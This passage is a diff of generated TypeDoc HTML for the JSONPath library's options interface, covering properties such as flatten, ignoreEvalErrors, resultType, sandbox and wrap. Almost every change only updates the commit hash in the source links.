href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L102\">jsonpath.d.ts:102</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"flatten\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>flatten</span><a href=\"#flatten\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">flatten</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether the returned array of results will be flattened to a\n single dimension array.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-3\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-3\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">false</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L40\">jsonpath.d.ts:40</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"ignoreEvalErrors\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>ignore<wbr/>Eval<wbr/>Errors</span><a href=\"#ignoreEvalErrors\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">ignore<wbr/>Eval<wbr/>Errors</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Ignore errors while evaluating JSONPath expression.</p>\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L40\">jsonpath.d.ts:40</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"ignoreEvalErrors\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>ignore<wbr/>Eval<wbr/>Errors</span><a href=\"#ignoreEvalErrors\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">ignore<wbr/>Eval<wbr/>Errors</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Ignore errors while evaluating JSONPath expression.</p>\n <p><code>true</code>: Don't break entire search if an error occurs while evaluating JSONPath expression on one key/value pair.</p>\n <p><code>false</code>: Break entire search if an error occurs while evaluating JSONPath expression on one key/value pair.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-4\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-4\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">false</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L113\">jsonpath.d.ts:113</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"json\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>json</span><a href=\"#json\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSON object to evaluate (whether of null, boolean, number,\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L113\">jsonpath.d.ts:113</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"json\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>json</span><a href=\"#json\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSON object to evaluate (whether of null, boolean, number,\n string, object, or array type).</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L26\">jsonpath.d.ts:26</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"otherTypeCallback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>other<wbr/>Type<wbr/>Callback</span><a href=\"#otherTypeCallback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>In the current absence of JSON Schema support,\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L26\">jsonpath.d.ts:26</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"otherTypeCallback\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>other<wbr/>Type<wbr/>Callback</span><a href=\"#otherTypeCallback\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">?:</span> <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></div><div class=\"tsd-comment tsd-typography\"><p>In the current absence of JSON Schema support,\n one can determine types beyond the built-in types by adding the\n perator <code>@other()</code> at the end of one's query.</p>\n <p>If such a path is encountered, the <code>otherTypeCallback</code> will be invoked\n\n@@ -63,20 +63,20 @@\ntransformations and return false).</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-5\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-5\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><p>undefined\n &lt;A function that throws an error when <code>@other()</code> is encountered&gt;</p>\n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L155\">jsonpath.d.ts:155</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"parent\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent</span><a href=\"#parent\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L155\">jsonpath.d.ts:155</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"parent\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent</span><a href=\"#parent\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n this allows the parent of that root node to be returned within results.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-6\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-6\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">null</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L120\">jsonpath.d.ts:120</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"parentProperty\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent<wbr/>Property</span><a href=\"#parentProperty\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent<wbr/>Property</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L120\">jsonpath.d.ts:120</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"parentProperty\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>parent<wbr/>Property</span><a href=\"#parentProperty\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">parent<wbr/>Property</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>In the event that a query could be made to return the root node,\n this allows the parentProperty of that root node to be returned within\n results.</p>\n </div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-7\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-7\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">null</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L128\">jsonpath.d.ts:128</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"path\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>path</span><a href=\"#path\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSONPath expression as a (normalized or unnormalized) string or\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L128\">jsonpath.d.ts:128</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"path\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>path</span><a href=\"#path\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></div><div class=\"tsd-comment tsd-typography\"><p>The JSONPath expression as a (normalized or unnormalized) string or\n array.</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L21\">jsonpath.d.ts:21</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"resultType\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>result<wbr/>Type</span><a href=\"#resultType\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">result<wbr/>Type</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span></div><div class=\"tsd-comment tsd-typography\"><p>Can be case-insensitive form of &quot;value&quot;, &quot;path&quot;, &quot;pointer&quot;, &quot;parent&quot;,\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L21\">jsonpath.d.ts:21</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"resultType\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>result<wbr/>Type</span><a href=\"#resultType\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">result<wbr/>Type</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span></div><div class=\"tsd-comment tsd-typography\"><p>Can be case-insensitive form of &quot;value&quot;, &quot;path&quot;, &quot;pointer&quot;, &quot;parent&quot;,\n or &quot;parentProperty&quot; to determine respectively whether to return\n results as the values of the found items, as their absolute paths,\n as JSON Pointers to the absolute paths, as their parent objects,\n\n@@ -86,11 +86,11 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-8\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-8\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-2\">&#39;value&#39;</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L53\">jsonpath.d.ts:53</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"sandbox\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>sandbox</span><a href=\"#sandbox\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">sandbox</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span></div><div class=\"tsd-comment tsd-typography\"><p>Key-value map of variables to be available to code evaluations such\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L53\">jsonpath.d.ts:53</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"sandbox\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>sandbox</span><a href=\"#sandbox\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">sandbox</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span></div><div class=\"tsd-comment tsd-typography\"><p>Key-value map of variables to be available to code evaluations such\n as filtering expressions.\n (Note that the current path and value will also be available to those\n expressions; see the Syntax section for details.)</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L62\">jsonpath.d.ts:62</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"wrap\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>wrap</span><a href=\"#wrap\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">wrap</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether or not to wrap the results in an array.</p>\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L62\">jsonpath.d.ts:62</a></li></ul></aside></section><section class=\"tsd-panel tsd-member\"><a id=\"wrap\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>wrap</span><a href=\"#wrap\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">wrap</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether or not to wrap the results in an array.</p>\n <p>If wrap is set to false, and no results are found, undefined will be\n returned (as opposed to an empty array when wrap is set to true).</p>\n <p>If wrap is set to false and a single non-array result is found, that\n\n@@ -102,4 +102,4 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-9\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-9\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">true</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L79\">jsonpath.d.ts:79</a></li></ul></aside></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#autostart\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a><a href=\"#callback\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback</span></a><a href=\"#eval\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval</span></a><a href=\"#flatten\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten</span></a><a href=\"#ignoreEvalErrors\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>ignore<wbr/>Eval<wbr/>Errors</span></a><a href=\"#json\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>json</span></a><a href=\"#otherTypeCallback\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>other<wbr/>Type<wbr/>Callback</span></a><a href=\"#parent\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent</span></a><a href=\"#parentProperty\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent<wbr/>Property</span></a><a href=\"#path\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>path</span></a><a href=\"#resultType\" class=\"\"><svg 